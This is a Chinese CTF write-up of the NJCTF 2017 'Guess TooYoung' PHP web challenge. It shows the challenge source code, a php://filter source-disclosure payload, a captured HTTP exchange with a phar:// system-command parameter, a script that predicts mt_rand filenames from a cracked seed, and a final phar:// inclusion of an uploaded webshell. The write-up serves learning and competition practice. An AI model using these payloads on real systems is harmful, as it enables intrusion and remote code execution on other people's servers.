---
title: Guess TooYoung
date: 2017-03-25 00:00:00
categories:
- CTF/Web
tags: NJCTF php黑魔法 php伪协议 文件包含 php_mt_seed
---

## 解题步骤

### 观察

- 查看网页源代码发现  

```html
 <form action="?page=upload" method="post" ...> // 毫不犹豫认为是文件包含漏洞
```

- 利用php伪协议读到index.php和upload.php源码

```php
php://filter/read=convert.base64-encode/resource=index
```

- 猜测和HCTF2016题目类似，通过上传包含php木马并更改后缀名的zip压缩包，通过文件包含漏洞使用phar://将其解析

### 源码

> index.php

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Upload</title>
    <link rel="stylesheet" href="http://fortawesome.github.io/Font-Awesome/assets/font-awesome/css/font-awesome.css">
    <link rel="stylesheet" href="CSS/upload.css">

</head>

<body>
<div class="msg info" id="message">
    <i class="fa fa-info-circle"></i>please upload an IMAGE file (gif|jpg|jpeg|png)
</div>
<div class="container">
    <form action="?page=upload" method="post" enctype="multipart/form-data" class="form">
        <div class="file-upload-wrapper" id="file" data-text="Select an image!">
            <label for="file-upload"> <input name="file-upload-field" type="file" class="file-upload-field" value=""
                                             id="file-upload"></label>
        </div>
        <div class="div">
            <input class="button" type="submit" value="Upload Image" name="submit">
        </div>
    </form>

    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src="js/filename.js"></script>

</div>


</body>
</html>

<?php
error_reporting(0);

session_start();
if(isset($_GET['page'])){
    $page=$_GET['page'];
}else{
    $page=null;
}

if(preg_match('/\.\./',$page))
{
    echo "<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>Attack Detected!</div>";
    die();
}

?>

<?php

if($page)
{
    if(!(include($page.'.php')))
    {
        echo "<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>error!</div>";
        exit;
    }
}
?>

```

> upload.php

```php


<?php
error_reporting(0);
function show_error_message($message)
{
    die("<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function show_message($message)
{
    echo("<div class=\"msg success\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function random_str($length = "32")
{
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';

    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

    return $str;
}

session_start();



$reg='/gif|jpg|jpeg|png/';
if (isset($_POST['submit'])) {

    $seed = rand(0,999999999);
    mt_srand($seed);
    $ss = mt_rand();
    $hash = md5(session_id() . $ss);
    setcookie('SESSI0N', $hash, time() + 3600);

    if ($_FILES["file"]["error"] > 0) {
        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
    }
    $check1 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/png"))
        && ($_FILES["file-upload-field"]["size"] < 204800));
    $check2=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));


    if ($check2) show_error_message("Nope!");
    if ($check1) {
        $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
        if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
        } else show_error_message("Something wrong with the upload...");
    } else {
        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
    }
}
?>

```

### 分析

- 可知关键部分在猜测文件名，文件名修改方式如下

```php
$filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
```

- 继续分析random_str()函数，可知mt_rand()函数负责伪随机数生成

```php
function random_str($length = "32")
{
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';

    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

    return $str;
}

```

- 分析mt_srand()播种函数与mt_rand()伪随机数生成函数关系，猜出$seed即可

```php
    $seed = rand(0,999999999);
    mt_srand($seed);
    $ss = mt_rand();
    $hash = md5(session_id() . $ss);
    setcookie('SESSI0N', $hash, time() + 3600);
```

- 可以通过提交session_id为空的方式，将$hash仅仅设置为mt_rand()生成的第一个伪随机数的md5值，报文如下

```
POST /?page=upload HTTP/1.1
Host: 218.2.197.235:23735
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://218.2.197.235:23735/?page=phar://uP1O4Ds/LIzus4MQWN5iVlIQfRbbWUmr3JdF9p9E_1.png/1&a=system&b=pwd
Cookie: PHPSESSID=; SESSI0N=93876488540c9ed68c15ba56702ff5d3
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------728368697298563885682044552
Content-Length: 24210

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Sat, 25 Mar 2017 13:43:43 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.5.9-1ubuntu4.20
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: SESSI0N=e75bdf69179f1b1bd3eb7d12b2995c49; expires=Sat, 25-Mar-2017 14:43:43 GMT; Max-Age=3600
Content-Length: 1229
```

- cmd5查询e75bdf69179f1b1bd3eb7d12b2995c49得到1168178173
- 通过这个 http://download.openwall.NET/pub/projects/php_mt_seed  工具解开得到：608520986
- 算出文件名：v21ImeR2gx9JTCXAKi1ErEXy26dHlEdq

```
<?php
$set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
    "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
    "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
    "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
    "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
$seed=608520986;
mt_srand($seed);
$ss = mt_rand();
$str="";
for ($i = 1; $i <= 32; ++$i) {
    $ch = mt_rand(0, count($set) - 1);
    $str .= $set[$ch];
}
echo $str;
?>
```

### payload

```
http://218.2.197.235:23735/index.php?page=phar://uP1O4Ds/v21ImeR2gx9JTCXAKi1ErEXy26dHlEdq_2.png/PHPJackal
```

- 成功上传木马得到flag：NJCTF{F1N411y_Y0U_fo00uND_M3!!}

## 知识小结
- php文件包含漏洞
- php伪协议读源码，绕过上传
- php中mt_srand()和mt_rand()函数关系以及使用工具爆破

## CVE漏洞编号
- [CVE-2010-5066]
- [CVE-2015-3458]